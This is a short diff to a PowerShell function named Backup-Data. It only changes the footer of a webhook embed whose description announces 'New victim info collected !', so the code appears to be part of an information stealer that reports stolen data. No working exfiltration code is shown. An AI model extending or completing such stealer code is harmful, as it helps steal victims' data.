@@ -1240,7 +1240,7 @@ function Backup-Data {
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
                 "footer"      = @{
-                    "text" = "Made by Kdot, Chainski and EvilByteCode"
+                    "text" = ":v"
                 }
                 "thumbnail"   = @{
                     "url" = "https://i.imgur.com/6w6qWCB.jpeg"
